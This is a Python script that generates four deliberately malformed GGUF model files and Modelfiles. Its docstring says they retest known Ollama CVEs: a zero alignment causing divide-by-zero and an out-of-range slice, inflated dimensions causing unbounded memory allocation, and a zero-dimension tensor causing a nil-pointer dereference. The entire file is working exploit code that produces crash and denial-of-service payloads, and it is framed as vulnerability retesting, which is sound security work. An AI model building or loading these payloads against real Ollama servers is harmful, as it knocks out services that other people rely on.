#!/usr/bin/env python3
"""
Generate 4 malicious GGUF files to retest known-unfixed Ollama CVEs
against the latest stable release (v0.17.0).

CVE-2025-0317: alignment=0 → divide by zero in ggufPadding
CVE-2025-0315: inflated dimensions → unbounded memory allocation
CVE-2025-0312: tensor with dims=[0,256] → nil pointer dereference
CVE-2024-12055: alignment=0 → makeslice: len out of range in readGGUFString
"""
import struct
import os
import sys

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

GGUF_TYPE_UINT32 = 4
GGUF_TYPE_INT32 = 5
GGUF_TYPE_FLOAT32 = 6
GGUF_TYPE_STRING = 8
GGUF_TYPE_ARRAY = 9

GGML_TYPE_F32 = 1


def write_kv(f, key, vtype, value):
    kb = key.encode("utf-8")
    f.write(struct.pack("<Q", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", vtype))
    if vtype == GGUF_TYPE_UINT32:
        f.write(struct.pack("<I", value))
    elif vtype == GGUF_TYPE_STRING:
        vb = value.encode("utf-8")
        f.write(struct.pack("<Q", len(vb)))
        f.write(vb)
    elif vtype == GGUF_TYPE_INT32:
        f.write(struct.pack("<i", value))
    elif vtype == GGUF_TYPE_FLOAT32:
        f.write(struct.pack("<f", value))
    elif vtype == GGUF_TYPE_ARRAY:
        elem_type, elems = value
        f.write(struct.pack("<I", elem_type))
        f.write(struct.pack("<Q", len(elems)))
        for v in elems:
            if elem_type == GGUF_TYPE_STRING:
                vb = v.encode("utf-8")
                f.write(struct.pack("<Q", len(vb)))
                f.write(vb)
            elif elem_type == GGUF_TYPE_FLOAT32:
                f.write(struct.pack("<f", v))
            elif elem_type == GGUF_TYPE_INT32:
                f.write(struct.pack("<i", v))


def write_tensor(f, name, n_dims, dims, tensor_type, offset):
    nb = name.encode("utf-8")
    f.write(struct.pack("<Q", len(nb)))
    f.write(nb)
    f.write(struct.pack("<I", n_dims))
    for d in dims:
        f.write(struct.pack("<Q", d))
    f.write(struct.pack("<I", tensor_type))
    f.write(struct.pack("<Q", offset))


def base_metadata(alignment=32, embedding=256, blocks=1, context=512, ffn=256):
    return [
        ("general.architecture", GGUF_TYPE_STRING, "llama"),
        ("general.file_type", GGUF_TYPE_UINT32, 2),
        ("general.quantization_version", GGUF_TYPE_UINT32, 2),
        ("general.alignment", GGUF_TYPE_UINT32, alignment),
        ("llama.context_length", GGUF_TYPE_UINT32, context),
        ("llama.embedding_length", GGUF_TYPE_UINT32, embedding),
        ("llama.block_count", GGUF_TYPE_UINT32, blocks),
        ("llama.attention.head_count", GGUF_TYPE_UINT32, 4),
        ("llama.attention.head_count_kv", GGUF_TYPE_UINT32, 4),
        ("llama.rope.dimension_count", GGUF_TYPE_UINT32, 64),
        ("llama.feed_forward_length", GGUF_TYPE_UINT32, ffn),
        ("tokenizer.ggml.model", GGUF_TYPE_STRING, "gpt2"),
        ("tokenizer.ggml.tokens", GGUF_TYPE_ARRAY,
         (GGUF_TYPE_STRING, ["<unk>", "<s>", "</s>"])),
        ("tokenizer.ggml.scores", GGUF_TYPE_ARRAY,
         (GGUF_TYPE_FLOAT32, [0.0, 0.0, 0.0])),
        ("tokenizer.ggml.token_type", GGUF_TYPE_ARRAY,
         (GGUF_TYPE_INT32, [1, 2, 2])),
        ("tokenizer.ggml.bos_token_id", GGUF_TYPE_INT32, 1),
        ("tokenizer.ggml.eos_token_id", GGUF_TYPE_INT32, 2),
        ("tokenizer.ggml.padding_token_id", GGUF_TYPE_INT32, 0),
    ]


def write_gguf(path, metadata, tensor_count=0, tensors=None):
    with open(path, "wb") as f:
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", len(metadata)))
        for key, vtype, val in metadata:
            write_kv(f, key, vtype, val)
        f.write(struct.pack("<Q", tensor_count))
        if tensors:
            for t in tensors:
                write_tensor(f, *t)
    print(f"  Created: {path}")


def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else "poc"
    os.makedirs(outdir, exist_ok=True)

    # CVE-2025-0317: alignment=0
    print("CVE-2025-0317: alignment=0 (divide by zero)")
    write_gguf(os.path.join(outdir, "cve-2025-0317.gguf"),
               base_metadata(alignment=0))

    # CVE-2025-0315: inflated dimensions
    print("CVE-2025-0315: inflated dimensions (unbounded alloc)")
    write_gguf(os.path.join(outdir, "cve-2025-0315.gguf"),
               base_metadata(alignment=32, embedding=0x100000,
                             blocks=0x4000, context=0x100000, ffn=0x80000))

    # CVE-2025-0312: tensor with zero dimension
    print("CVE-2025-0312: zero-dim tensor (nil pointer deref)")
    meta = base_metadata(alignment=32)
    write_gguf(os.path.join(outdir, "cve-2025-0312.gguf"), meta,
               tensor_count=1,
               tensors=[("token_embd", 2, [0, 256], GGML_TYPE_F32, 0)])

    # CVE-2024-12055: alignment=0 (different crash path: readGGUFString)
    print("CVE-2024-12055: alignment=0 (unbounded readString)")
    write_gguf(os.path.join(outdir, "cve-2024-12055.gguf"),
               base_metadata(alignment=0))

    # Write Modelfiles
    for name in ["cve-2025-0317", "cve-2025-0315", "cve-2025-0312", "cve-2024-12055"]:
        mf = os.path.join(outdir, f"Modelfile.{name}")
        with open(mf, "w") as f:
            f.write(f"FROM /poc/{name}.gguf\n")
        print(f"  Created: {mf}")

    print("\nDone. All 4 GGUF payloads and Modelfiles generated.")


if __name__ == "__main__":
    main()
